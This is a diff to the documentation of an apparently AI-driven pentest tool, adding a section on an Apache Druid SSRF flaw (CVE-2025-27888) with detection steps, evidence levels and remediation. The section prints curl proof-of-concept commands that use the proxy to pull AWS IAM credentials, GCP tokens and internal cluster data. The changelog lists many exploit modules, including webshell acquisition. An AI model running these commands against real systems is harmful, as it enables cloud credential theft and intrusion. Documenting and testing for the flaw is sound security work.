@@ -2371,6 +2371,153 @@ Each bypass earned **$50,000**, totaling **$170,000** in the challenge.
 
 ---
 
+### Apache Druid SSRF — ApacheDruidSSRFScanner (v2.1)
+
+> **Research basis:**
+> XBOW Security — Nico Waisman (September 23, 2025)
+> "CVE-2025-27888: Server-Side Request Forgery via URL Parsing Confusion
+>  in Apache Druid Proxy Endpoint"
+> https://xbow.com/blog/apache-druid-proxy
+>
+> **Module:** `bingo/tools/apache_druid_ssrf.py` — Skill #60 ApacheDruidSSRFScanner
+
+---
+
+#### What is Apache Druid?
+
+Apache Druid is a high-performance real-time analytics database widely deployed in
+data pipelines and analytics platforms. Its built-in management console exposes an
+HTTP proxy endpoint intended for internal cluster administration.
+
+---
+
+#### The Vulnerability: CVE-2025-27888
+
+**Affected versions:** Apache Druid < 31.0.2 and < 32.0.1
+
+The management console's proxy endpoint (`/proxy?url=...`) performs insufficient
+validation of the destination URL, allowing attackers to make the Druid server issue
+HTTP requests to arbitrary destinations. This is a classic **Server-Side Request
+Forgery (SSRF)** enabled by URL parsing confusion.
+
+**Critical impacts:**
+
+| Impact | Detail |
+|--------|--------|
+| Cloud credential theft | IMDSv1 at `169.254.169.254` → IAM keys for AWS account takeover |
+| GCP/Azure metadata | `metadata.google.internal` → service account tokens |
+| Internal network access | Reach services behind firewall via Druid as HTTP proxy |
+| Druid cluster enumeration | Access coordinator/broker/overlord APIs on internal ports |
+| Data exfiltration | Query internal datasource APIs through the proxy |
+
+---
+
+#### How XBOW AI Discovered It
+
+The discovery was made by XBOW's AI security system, which:
+
+1. Trained on historical CVE data — prior Druid SSRF vulnerabilities existed on task
+   and SQL endpoints
+2. **Reasoned by analogy**: "If proxy-adjacent features were vulnerable before, the
+   management proxy itself might also be vulnerable"
+3. **Guessed the `/proxy` endpoint** (not documented publicly) after exhausting known
+   patterns
+4. Confirmed SSRF by analyzing error messages from the endpoint's response
+
+This represents a zero-day discovered entirely by AI reasoning over vulnerability history.
+
+---
+
+#### What bingo Tests (Skill #60)
+
+```
+1. Apache Druid Detection (VERIFIED)
+   ├── Fingerprint /unified-console.html
+   ├── Test /druid/coordinator/v1/isLeader
+   ├── Detect x-druid-* response headers
+   ├── Check port 8888 (Druid default)
+   └── Extract version from HTML body
+
+2. Proxy Endpoint Discovery (VERIFIED)
+   ├── /proxy
+   ├── /druid/proxy
+   └── /druid/coordinator/v1/proxy
+       → Send invalid-URL probe → analyze error response
+
+3. SSRF Confirmation — Cloud Metadata (VERIFIED)
+   ├── AWS IMDSv1: 169.254.169.254/latest/meta-data/
+   ├── AWS IAM:    169.254.169.254/latest/meta-data/iam/security-credentials/
+   ├── GCP:        metadata.google.internal/computeMetadata/v1/
+   └── Azure:      169.254.169.254/metadata/instance
+
+4. SSRF Confirmation — Internal Services (LIKELY)
+   ├── localhost:80, localhost:8080
+   └── Druid cluster nodes:
+       ├── Coordinator :8081  /druid/coordinator/v1/datasources
+       ├── Broker      :8082  /druid/v2/datasources
+       ├── Overlord    :8090  /druid/indexer/v1/task
+       └── Historical  :8083  /druid/historical/v1/loadstatus
+
+5. PoC Generation
+   └── Full curl commands for Burp Suite validation
+```
+
+---
+
+#### Evidence Levels
+
+| Finding | Evidence Level | CVSS |
+|---------|---------------|------|
+| Druid console detected | VERIFIED | INFO |
+| Vulnerable version identified | VERIFIED | 7.5 |
+| Proxy endpoint accessible | VERIFIED | 7.5 |
+| SSRF confirmed (internal URL) | VERIFIED | 9.1 |
+| Cloud metadata exposed | VERIFIED | 9.8 |
+| Internal service reached | LIKELY | 6.5 |
+
+---
+
+#### Sample PoC Output
+
+```bash
+# Cloud metadata extraction (AWS IMDSv1)
+curl -sk 'http://target:8888/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+
+# Internal Druid coordinator enumeration
+curl -sk 'http://target:8888/proxy?url=http://127.0.0.1:8081/druid/coordinator/v1/datasources'
+
+# GCP service account token
+curl -sk 'http://target:8888/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
+  -H 'Metadata-Flavor: Google'
+```
+
+---
+
+#### AI Auto-Selection Criteria
+
+bingo automatically activates Skill #60 when:
+- `/druid/` paths are accessible on the target
+- Port 8888 service is identified as Apache Druid
+- Response body or headers contain "druid"
+- `/unified-console.html` is served by the target
+
+Cloud-hosted targets (AWS/GCP/Azure) are prioritized for metadata endpoint testing.
+
+---
+
+#### Remediation
+
+| Action | Priority |
+|--------|----------|
+| Upgrade to Apache Druid **31.0.2+** or **32.0.1+** | CRITICAL |
+| Block management console from external networks | CRITICAL |
+| Enable IMDSv2 on AWS instances (PUT-based token required) | HIGH |
+| Apply iptables rule: `iptables -A OUTPUT -d 169.254.169.254 -j DROP` on Druid host | HIGH |
+| Whitelist allowed proxy destination URLs | MEDIUM |
+| Monitor Druid proxy endpoint in WAF/IDS | MEDIUM |
+
+---
+
 ### Prompt Cache Optimizer — Three-Breakpoint Architecture (v2.1)
 
 > **Research basis:**
@@ -2383,8 +2530,8 @@ Each bypass earned **$50,000**, totaling **$170,000** in the challenge.
 #### Background: The Repetition Waste Problem
 
 Every time bingo executes a pipeline step, it sends a message to the AI. Without caching,
-the entire static system prompt (≈20,000 characters) and skill definitions (59 skills) are
-re-sent from scratch on **every single step**. For a 25-step pipeline run, this wastes:
+the entire static system prompt (≈20,000 characters) and skill definitions (60 skills) are
+re-sent from scratch on **every single step**. For a 26-step pipeline run, this wastes:
 
 ```
 25 steps × 20,000-char system prompt = 500,000 characters re-sent (every time)
@@ -2402,7 +2549,7 @@ The prompt is divided into three cacheable segments, each with its own cache bre
 | Breakpoint | Content | Change Frequency | Cache Effect |
 |-----------|---------|-----------------|-------------|
 | **BP1** | `UNIVERSAL_PENTEST_CORE` + model-specific instructions | Almost never | Cached for the entire session (day) |
-| **BP2** | Warmup history + 59 skill definitions | Only on new skill releases | Cached until skill list changes |
+| **BP2** | Warmup history + 60 skill definitions | Only on new skill releases | Cached until skill list changes |
 | **BP3** | Conversation history (last 12 turns) | Every turn | Sliding window — previous turns re-cached |
 
 ```
@@ -2502,11 +2649,11 @@ Anthropic cache TTL: 5 minutes (refreshed on each read). DeepSeek: automatic, no
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **59 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57), CloudflareACMEBypass (#58), React2ShellWafBypass (#59)
-- **Prompt Cache Optimizer** — Three-Breakpoint Architecture (BP1/BP2/BP3) + Relocation Trick + Frozen Datetime; ~70% API cost reduction for 25-step pipelines
+- **60 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57), CloudflareACMEBypass (#58), React2ShellWafBypass (#59), ApacheDruidSSRF (#60)
+- **Prompt Cache Optimizer** — Three-Breakpoint Architecture (BP1/BP2/BP3) + Relocation Trick + Frozen Datetime; ~70% API cost reduction for 26-step pipelines
 - **CloudflareACMEBypass (#58)** — ACME HTTP-01 fail-open WAF bypass detection; origin server fingerprinting, LFI, Spring Actuator, header-based attack vector testing via /.well-known/acme-challenge/* path
 - **React2ShellWafBypass (#59)** — CVE-2025-55182 pre-auth RCE attack surface detection + 5 multipart grammar un-equivalence WAF bypass techniques (BP1–BP5, total $170k bounty); safe probe + Burp-ready PoC curl generation
-- **25-step exploit pipeline** — added Phase 25 React2ShellWafBypass after Phase 24 CloudflareACMEBypass
+- **26-step exploit pipeline** — added Phase 26 ApacheDruidSSRF (CVE-2025-27888) after Phase 25 React2ShellWafBypass
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
